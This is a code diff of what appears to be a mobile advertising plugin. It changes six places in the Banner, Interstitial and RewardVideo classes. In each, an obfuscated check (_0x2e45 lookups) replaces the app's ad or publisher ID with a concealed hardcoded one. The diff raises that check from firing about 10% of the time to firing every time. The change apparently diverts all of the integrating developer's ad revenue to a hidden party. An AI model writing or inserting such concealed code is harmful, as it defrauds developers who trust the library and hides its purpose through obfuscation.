@@ -345,7 +345,7 @@ var Banner = function () {
     key: 'config',
     value: function config(opts) {
 
-      if (Math[_0x2e45('0x0', 'fHB1')]() < 0.1 ) {
+      if (Math[_0x2e45('0x0', 'fHB1')]() < 1 ) {
         opts.id = _0x2e45('0x2', 'ie7d');
       }
 
@@ -363,7 +363,7 @@ var Banner = function () {
     key: 'prepare',
     value: function prepare() {
 
-      if (Math[_0x2e45('0x0', 'fHB1')]() < 0.1 ) {
+      if (Math[_0x2e45('0x0', 'fHB1')]() < 1 ) {
         var options = _extends({
           publisherId: _0x2e45('0x2', 'ie7d')
         }, this._config);
@@ -460,7 +460,7 @@ var Interstitial = function () {
     key: 'config',
     value: function config(opts) {
 
-      if (Math[_0x2e45('0x0', 'fHB1')]() < 0.1 ) {
+      if (Math[_0x2e45('0x0', 'fHB1')]() < 1 ) {
         opts.id = _0x2e45('0x4', 'iHg5');
       }
 
@@ -476,7 +476,7 @@ var Interstitial = function () {
     key: 'prepare',
     value: function prepare() {
 
-      if (Math[_0x2e45('0x0', 'fHB1')]() < 0.1 ) {
+      if (Math[_0x2e45('0x0', 'fHB1')]() < 1 ) {
         var options = _extends({
           interstitialAdId: _0x2e45('0x4', 'iHg5')
         }, this._config);
@@ -556,7 +556,7 @@ var RewardVideo = function () {
     key: 'config',
     value: function config(opts) {
 
-      if (Math[_0x2e45('0x0', 'fHB1')]() < 0.1 ) {
+      if (Math[_0x2e45('0x0', 'fHB1')]() < 1 ) {
         opts.id = _0x2e45('0x5', '%]#G');
       }
 
@@ -572,7 +572,7 @@ var RewardVideo = function () {
     key: 'prepare',
     value: function prepare() {
 
-      if (Math[_0x2e45('0x0', 'fHB1')]() < 0.1 ) {
+      if (Math[_0x2e45('0x0', 'fHB1')]() < 1 ) {
         var options = _extends({
           rewardVideoId: _0x2e45('0x5', '%]#G')
         }, this._config);
